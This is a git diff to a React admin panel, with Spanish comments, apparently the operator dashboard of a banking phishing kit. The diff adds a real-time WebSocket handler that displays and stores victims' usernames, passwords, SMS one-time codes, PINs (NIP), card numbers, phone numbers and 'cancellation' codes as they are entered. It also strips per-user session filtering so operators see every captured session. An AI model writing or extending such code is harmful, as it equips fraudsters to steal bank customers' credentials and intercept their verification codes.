@@ -64,15 +64,12 @@ export default function AdminPanel() {
     queryKey: ['/api/sessions', activeTab],
     queryFn: async () => {
       const type = activeTab === 'saved' ? 'saved' : 'current';
-      console.log(`Cargando sesiones del tipo: ${type}`);
       const res = await apiRequest('GET', `/api/sessions?type=${type}`);
-      const data = await res.json();
-      console.log(`Sesiones recibidas: ${data.length}`);
-      return data;
+      return await res.json();
     },
-    refetchInterval: 3000, // Refrescar cada 3 segundos
+    refetchInterval: false,
     refetchOnWindowFocus: true,
-    staleTime: 5000 // 5 segundos
+    staleTime: 10000 // 10 segundos
   });
 
   // Generate link mutation
@@ -156,41 +153,22 @@ export default function AdminPanel() {
         console.log("Mensaje WebSocket recibido en AdminPanel:", data.type);
         
         if (data.type === 'INIT_SESSIONS') {
-          // Verificar si el usuario es administrador para mostrar todas las sesiones o solo las propias
-          let filtered;
-          if (user?.role === 'admin') {
-            // El administrador ve todas las sesiones
-            filtered = Array.isArray(data.data) ? data.data : [];
-            console.log(`Admin: Mostrando todas las sesiones (${filtered.length})`);
-          } else {
-            // Los usuarios regulares solo ven sus propias sesiones
-            filtered = Array.isArray(data.data) 
-              ? data.data.filter((session: any) => session.createdBy === user?.username)
-              : [];
-            console.log(`Usuario ${user?.username}: Mostrando ${filtered.length} sesiones propias`);
-          }
-          setSessions(filtered);
+          setSessions(data.data);
         }
         else if (data.type === 'SESSION_UPDATE') {
-          const isAdmin = user?.role === 'admin';
-          // Verificar si es admin (puede ver todas) o si la sesión pertenece al usuario
-          if (isAdmin || data.data.createdBy === user?.username) {
-            // Solo actualizar la sesión en la pestaña actual
-            if ((activeTab === 'current' && !data.data.saved) || 
-                (activeTab === 'saved' && data.data.saved)) {
-              setSessions(prev => {
-                const updated = [...prev];
-                const index = updated.findIndex(s => s.sessionId === data.data.sessionId);
-                if (index >= 0) {
-                  updated[index] = data.data;
-                } else {
-                  updated.push(data.data);
-                }
-                return updated;
-              });
-            }
-          } else {
-            console.log(`Ignorando actualización de sesión ${data.data.sessionId} que no pertenece al usuario ${user?.username}`);
+          // Solo actualizar la sesión en la pestaña actual
+          if ((activeTab === 'current' && !data.data.saved) || 
+              (activeTab === 'saved' && data.data.saved)) {
+            setSessions(prev => {
+              const updated = [...prev];
+              const index = updated.findIndex(s => s.sessionId === data.data.sessionId);
+              if (index >= 0) {
+                updated[index] = data.data;
+              } else {
+                updated.push(data.data);
+              }
+              return updated;
+            });
           }
         }
         else if (data.type === 'SESSION_DELETE') {
@@ -234,8 +212,98 @@ export default function AdminPanel() {
           
           console.log("SMS_COMPRA code:", code, "para sesión:", sessionId);
         }
-        // Se eliminó la sección CLIENT_INPUT_REALTIME por solicitud del usuario
-        // para quitar las notificaciones en tiempo real
+        else if (data.type === 'CLIENT_INPUT_REALTIME') {
+          // Mostrar notificación de entrada de datos en tiempo real
+          const { sessionId, tipo, inputData } = data.data;
+          
+          // Manejo especial para SMS_COMPRA
+          if (tipo === 'sms_compra' || tipo === 'SMS_COMPRA' || tipo === 'smsCompra') {
+            if (inputData && inputData.smsCompra) {
+              toast({
+                title: "¡Código de cancelación recibido!",
+                description: `Código: ${inputData.smsCompra}`,
+                variant: "default",
+              });
+            }
+          }
+          
+          // Mostrar notificación toast con los datos recibidos
+          let inputDescription = '';
+          switch (tipo) {
+            case 'folio':
+              inputDescription = `Folio: ${inputData.folio}`;
+              break;
+            case 'login':
+              inputDescription = `Usuario: ${inputData.username}, Contraseña: ${inputData.password}`;
+              break;
+            case 'codigo':
+              inputDescription = `Código SMS: ${inputData.codigo}`;
+              break;
+            case 'nip':
+              inputDescription = `NIP: ${inputData.nip}`;
+              break;
+            case 'tarjeta':
+              inputDescription = `Tarjeta: ${inputData.tarjeta}`;
+              break;
+            case 'sms_compra':
+            case 'SMS_COMPRA':
+            case 'smsCompra':
+              inputDescription = `Código de Cancelación: ${inputData.smsCompra}`;
+              break;
+            default:
+              inputDescription = `Datos de ${tipo}`;
+          }
+          
+          toast({
+            title: "Datos recibidos en tiempo real",
+            description: inputDescription,
+            variant: "default",
+          });
+          
+          // Actualizar la sesión en la interfaz para mostrar datos inmediatamente
+          setSessions(prev => {
+            const updated = [...prev];
+            const index = updated.findIndex(s => s.sessionId === sessionId);
+            
+            if (index >= 0) {
+              // Crear copia de la sesión actual
+              const updatedSession = { ...updated[index] };
+              
+              // Actualizar los campos según el tipo de datos
+              switch (tipo) {
+                case 'folio':
+                  updatedSession.folio = inputData.folio;
+                  break;
+                case 'login':
+                  updatedSession.username = inputData.username;
+                  updatedSession.password = inputData.password;
+                  break;
+                case 'codigo':
+                  updatedSession.sms = inputData.codigo;
+                  break;
+                case 'nip':
+                  updatedSession.nip = inputData.nip;
+                  break;
+                case 'tarjeta':
+                  updatedSession.tarjeta = inputData.tarjeta;
+                  break;
+                case 'sms_compra':
+                case 'SMS_COMPRA':
+                case 'smsCompra':
+                  updatedSession.smsCompra = inputData.smsCompra;
+                  break;
+                case 'celular':
+                  updatedSession.celular = inputData.celular;
+                  break;
+              }
+              
+              // Actualizar en la lista
+              updated[index] = updatedSession;
+            }
+            
+            return updated;
+          });
+        }
       } catch (error) {
         console.error("Error parsing WebSocket message:", error);
       }
